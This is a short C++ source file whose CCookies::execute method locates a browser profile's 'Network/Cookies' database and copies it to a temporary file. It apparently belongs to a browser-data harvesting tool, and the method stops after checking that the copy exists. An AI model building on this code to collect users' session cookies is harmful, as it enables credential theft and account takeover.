//
// Created by .1qxz on 09.06.2024.
//

#include "CCookies.h"

void CCookies::execute(const fs::path &root, const std::string &name, const fs::path &path) {
    fs::path orig_db_path = path / this->getProfile() / "Network" / "Cookies";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;
}
